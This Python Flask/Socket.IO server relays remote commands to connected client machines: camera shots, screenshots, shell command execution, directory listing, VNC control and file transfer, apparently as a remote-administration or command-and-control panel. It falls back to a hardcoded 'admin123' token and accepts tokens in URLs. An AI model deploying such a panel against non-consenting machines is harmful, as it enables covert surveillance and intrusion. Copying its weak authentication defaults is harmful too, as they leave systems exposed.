from flask import Flask, request, jsonify, send_from_directory, Response
from flask_socketio import SocketIO, emit, join_room
from werkzeug.utils import secure_filename
import os
import uuid
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', os.urandom(24).hex())
socketio = SocketIO(app, cors_allowed_origins=os.environ.get('CORS_ORIGINS', '*').split(','))

# 配置
PHOTO_DIR = os.path.join(BASE_DIR, 'photos')
DOWNLOADS_DIR = os.path.join(BASE_DIR, 'downloads')
UPLOADS_DIR = os.path.join(BASE_DIR, 'uploads')
CLIENT_ROOM = 'clients'
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5000

# 安全配置
AUTH_TOKEN = os.environ.get('AUTH_TOKEN')
if not AUTH_TOKEN:
    import logging
    logging.warning("AUTH_TOKEN environment variable not set! Using default token 'admin123'.")
    AUTH_TOKEN = 'admin123'

# 文件上传配置
MAX_PHOTOS = 1000
MAX_FILES_PER_DIR = 100
ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png'}

# 确保目录存在
os.makedirs(PHOTO_DIR, exist_ok=True)
os.makedirs(DOWNLOADS_DIR, exist_ok=True)
os.makedirs(UPLOADS_DIR, exist_ok=True)

# 允许上传大文件，例如 1GB
app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024 * 1024

# 客户端状态管理
clients = {}

@app.before_request
def require_auth():
    # 跳过静态文件和 Socket.IO (因为 Socket.IO 有自己的 connect 事件验证)
    if request.path.startswith('/socket.io/'):
        return None
        
    # 允许从 header 或 query parameter 或 Basic Auth 获取 token
    token = None
    
    # 检查 Authorization header (Bearer token)
    auth_header = request.headers.get('Authorization')
    if auth_header and auth_header.startswith('Bearer '):
        token = auth_header.split(' ')[1]
        
    # 检查 Basic Auth (给浏览器用户用，用户名可任意，密码必须是 AUTH_TOKEN)
    if not token and request.authorization:
        if request.authorization.type == 'basic' and request.authorization.password == AUTH_TOKEN:
            token = AUTH_TOKEN
            
    # 检查 URL 参数
    if not token:
        token = request.args.get('token')
        
    if token != AUTH_TOKEN:
        # 验证失败，要求 Basic Auth
        return Response(
            'Authentication required. Username can be anything, password is the token.', 401,
            {'WWW-Authenticate': 'Basic realm="Login Required"'}
        )

@app.route('/')
def index():
    return send_from_directory(BASE_DIR, 'index.html')

@app.route('/photos')
def get_photos():
    """获取照片列表"""
    photos = []
    
    # 限制返回数量，防止 I/O 过载
    max_photos = 100
    
    try:
        entries = os.listdir(PHOTO_DIR)
        for filename in entries:
            if filename.endswith(tuple(ALLOWED_EXTENSIONS)):
                file_path = os.path.join(PHOTO_DIR, filename)
                try:
                    stat = os.stat(file_path)
                    photos.append({
                        'filename': filename,
                        'size': stat.st_size,
                        'timestamp': stat.st_mtime
                    })
                except FileNotFoundError:
                    # 文件可能在 listdir 和 stat 之间被删除
                    continue
    except OSError as e:
        return jsonify({'error': str(e)}), 500
        
    # 按时间倒序排序并限制返回数量
    photos.sort(key=lambda x: x['timestamp'], reverse=True)
    return jsonify(photos[:max_photos])

@app.route('/photos/<filename>')
def get_photo(filename):
    """下载照片"""
    # 使用 secure_filename 确保文件名安全，防止路径遍历攻击
    safe_filename = secure_filename(filename)
    if not safe_filename:
        return jsonify({'error': 'Invalid filename'}), 400
    
    # 确保文件存在且在正确目录中
    file_path = os.path.join(PHOTO_DIR, safe_filename)
    if not os.path.isfile(file_path):
        return jsonify({'error': 'File not found'}), 404
    
    return send_from_directory(PHOTO_DIR, safe_filename, as_attachment=True)

@app.route('/upload', methods=['POST'])
def upload_photo():
    """接收客户端上传的照片"""
    if 'photo' not in request.files:
        return jsonify({'error': 'No photo file'}), 400
    
    file = request.files['photo']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    
    # 增加安全性检查：限制上传文件类型
    file_ext = os.path.splitext(file.filename.lower())[1]
    
    if file_ext not in ALLOWED_EXTENSIONS:
        return jsonify({'error': 'Invalid file type'}), 400
    
    # 生成唯一文件名，保留真实后缀
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    unique_id = str(uuid.uuid4())[:8]
    filename = f"{timestamp}_{unique_id}{file_ext}"
    file_path = os.path.join(PHOTO_DIR, filename)
    
    # 限制总照片数量，避免 DoS 攻击耗尽磁盘
    try:
        photos = [os.path.join(PHOTO_DIR, f) for f in os.listdir(PHOTO_DIR) if f.endswith(tuple(ALLOWED_EXTENSIONS))]
        if len(photos) >= MAX_PHOTOS:
            # 按修改时间排序，删除最老的
            photos.sort(key=os.path.getmtime)
            for old_photo in photos[:10]: # 每次清理10张
                try:
                    os.remove(old_photo)
                except OSError:
                    pass
    except Exception as e:
        print(f"Error cleaning up old photos: {e}")
        
    file.save(file_path)
    
    # 广播事件给所有连接的客户端（主要是网页端），通知有新照片上传
    socketio.emit('photo_uploaded')
    
    return jsonify({'success': True, 'filename': filename})

@app.route('/shoot', methods=['POST'])
def shoot():
    """接收网页拍摄指令，转发给客户端"""
    data = request.get_json() or {}
    client_id = data.get('client_id', 'all')
    
    print(f"Shoot command received, target: {client_id}")
    
    if client_id == 'all':
        for cid in clients:
            socketio.emit('shoot', room=cid)
            print(f"Sent shoot command to client: {cid}")
        return jsonify({'success': True, 'message': f'Shoot command sent to {len(clients)} clients'})
    else:
        if client_id in clients:
            socketio.emit('shoot', room=client_id)
            print(f"Sent shoot command to client: {client_id}")
            return jsonify({'success': True, 'message': f'Shoot command sent to {client_id}'})
        else:
            return jsonify({'error': 'Client not found'}), 404

@app.route('/clients')
def get_clients():
    """获取客户端列表"""
    return jsonify(list(clients.keys()))

def _clean_uploads_dir(directory, max_files=None):
    """清理上传下载目录中的旧文件，防止 DoS"""
    if max_files is None:
        max_files = MAX_FILES_PER_DIR
        
    try:
        files = [os.path.join(directory, f) for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]
        if len(files) > max_files:
            files.sort(key=os.path.getmtime)
            for old_file in files[:max_files//2]: # 超过上限则清理一半最老的文件
                try:
                    os.remove(old_file)
                except OSError:
                    pass
    except Exception as e:
        print(f"Error cleaning up {directory}: {e}")

@app.route('/upload_to_client', methods=['POST'])
def upload_to_client():
    """接收网页端上传的文件，并通知客户端下载"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    
    file = request.files['file']
    client_id = request.form.get('client_id')
    target_dir = request.form.get('target_dir')
    
    if not client_id or not target_dir:
        return jsonify({'error': 'Missing client_id or target_dir'}), 400
        
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
        
    safe_filename = secure_filename(file.filename)
    if not safe_filename:
        # Fallback for non-ASCII filenames
        # 使用 uuid 作为存储名，防止中文名经过 replace 导致路径遍历或其他不可预知行为
        file_ext = os.path.splitext(file.filename)[1]
        safe_filename = f"fallback_{uuid.uuid4().hex[:8]}{file_ext}"
        
    # 执行旧文件清理
    _clean_uploads_dir(UPLOADS_DIR)
    
    # 保存文件到服务器上传目录
    file_path = os.path.join(UPLOADS_DIR, safe_filename)
    file.save(file_path)
    
    # 获取下载 URL (让客户端下载)
    download_url = f"{request.host_url.rstrip('/')}/download_from_server/uploads/{safe_filename}"
    
    # 通知客户端下载该文件
    # file.filename 作为显示用的原始名，需前端进行 HTML 转义
    socketio.emit('download_file', {
        'url': download_url,
        'target_dir': target_dir,
        'filename': file.filename
    }, room=client_id)
    
    return jsonify({'success': True, 'message': 'File uploaded to server, notifying client'})

@app.route('/client_upload_file', methods=['POST'])
def client_upload_file():
    """接收客户端上传的请求下载的文件"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
        
    file = request.files['file']
    original_filename = request.form.get('filename', file.filename)
    
    safe_filename = secure_filename(original_filename)
    if not safe_filename:
        file_ext = os.path.splitext(original_filename)[1]
        safe_filename = f"fallback_{uuid.uuid4().hex[:8]}{file_ext}"
        
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    unique_id = str(uuid.uuid4())[:8]
    # 保留原始文件名作为前缀的可见部分（如果 secure_filename 成功的话）
    save_filename = f"{timestamp}_{unique_id}_{safe_filename}"
    
    _clean_uploads_dir(DOWNLOADS_DIR)
    
    file_path = os.path.join(DOWNLOADS_DIR, save_filename)
    file.save(file_path)
    
    # 通知网页端文件已准备好下载
    download_url = f"/download_from_server/downloads/{save_filename}"
    socketio.emit('file_download_ready', {
        'url': download_url,
        'filename': original_filename
    })
    
    return jsonify({'success': True})

@app.route('/download_from_server/<folder>/<filename>')
def download_from_server(folder, filename):
    """提供文件下载服务（给客户端或网页端）"""
    if folder not in ['uploads', 'downloads']:
        return jsonify({'error': 'Invalid folder'}), 400
        
    # 使用secure_filename确保文件名安全，防止路径遍历攻击
    safe_filename = secure_filename(filename)
    if not safe_filename:
        return jsonify({'error': 'Invalid filename'}), 400
        
    dir_path = UPLOADS_DIR if folder == 'uploads' else DOWNLOADS_DIR
    
    # 确保文件路径在指定目录内
    file_path = os.path.join(dir_path, safe_filename)
    if not os.path.isfile(file_path):
        return jsonify({'error': 'File not found'}), 404
        
    # Send original filename for downloads
    original_name = safe_filename
    if folder == 'downloads' and '_' in safe_filename:
        # Try to extract original name from timestamp_uuid_name format
        parts = safe_filename.split('_', 2)
        if len(parts) >= 3:
            original_name = parts[2]
            
    return send_from_directory(dir_path, safe_filename, as_attachment=True, download_name=original_name)

# 使用循环简化路由注册，但需要注意闭包参数捕获以及验证
def _create_event_handler(evt):
    def _handle_event(data):
        # 参数 evt 通过闭包捕获，避免客户端注入覆盖
        client_id = data.get('client_id')
        if client_id == 'all' and evt in ['take_screenshot', 'client_control']:
            for cid in clients:
                socketio.emit(evt, data, room=cid)
        elif client_id in clients:
            socketio.emit(evt, data, room=client_id)
    return _handle_event

for event in ['take_screenshot', 'execute_command', 'list_dir', 'start_vnc', 'stop_vnc', 'vnc_mouse_event', 'vnc_key_event', 'client_control']:
    socketio.on(event)(_create_event_handler(event))

@socketio.on('dir_list_result')
def handle_dir_list_result(data):
    if 'client_id' not in data:
        data['client_id'] = request.sid
    socketio.emit('dir_list_result', data)

@socketio.on('command_result')
def handle_command_result(data):
    # 转发给所有网页客户端
    if 'client_id' not in data:
        data['client_id'] = request.sid
    socketio.emit('command_result', data)

@socketio.on('request_download')
def handle_request_download(data):
    client_id = data.get('client_id')
    if client_id in clients:
        socketio.emit('upload_file_to_server', data, room=client_id)

@socketio.on('client_upload_error')
def handle_client_upload_error(data):
    socketio.emit('file_download_ready', {'error': data.get('error')})

@socketio.on('client_download_complete')
def handle_client_download_complete(data):
    socketio.emit('client_upload_complete', data)

@socketio.on('vnc_frame')
def handle_vnc_frame(data):
    socketio.emit('vnc_frame', data)

@socketio.on('connect')
def handle_connect(auth=None):
    """处理客户端连接"""
    # 验证 Socket.IO 连接
    auth_valid = False
    
    # 1. 检查 Header 中的 Bearer token (用于 Python 客户端)
    auth_header = request.headers.get('Authorization')
    if auth_header and auth_header.startswith('Bearer '):
        if auth_header.split(' ')[1] == AUTH_TOKEN:
            auth_valid = True
            
    # 2. 检查 Basic Auth (用于浏览器网页端客户端)
    elif request.authorization and request.authorization.password == AUTH_TOKEN:
        auth_valid = True
        
    # 3. 检查 URL 参数
    elif request.args.get('token') == AUTH_TOKEN:
        auth_valid = True
        
    if not auth_valid:
        print("Connection rejected: Unauthorized")
        return False  # 拒绝连接

    client_id = request.sid
    
    # 从请求头判断是否为被控端客户端（被控端客户端会发送特殊标识）
    user_agent = request.headers.get('User-Agent', '')
    # 只有包含'RemoteClient'或旧版'CameraClient'标识的连接才被视为被控端客户端
    if 'RemoteClient' in user_agent or 'CameraClient' in user_agent:
        clients[client_id] = {
            'connected_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        join_room(CLIENT_ROOM)
        print(f"Remote client connected: {client_id}")
        emit('client_connected', {'client_id': client_id}, broadcast=True)
    else:
        print(f"Web client connected: {client_id}")

@socketio.on('disconnect')
def handle_disconnect():
    """处理客户端断开连接"""
    client_id = request.sid
    if client_id in clients:
        del clients[client_id]
        print(f"Remote client disconnected: {client_id}")
        emit('client_disconnected', {'client_id': client_id}, broadcast=True)
    else:
        print(f"Web client disconnected: {client_id}")

if __name__ == '__main__':
    print(f"Server starting on {SERVER_HOST}:{SERVER_PORT}")
    print(f"Photos will be stored in: {os.path.abspath(PHOTO_DIR)}")
    socketio.run(app, host=SERVER_HOST, port=SERVER_PORT, debug=False, allow_unsafe_werkzeug=True)
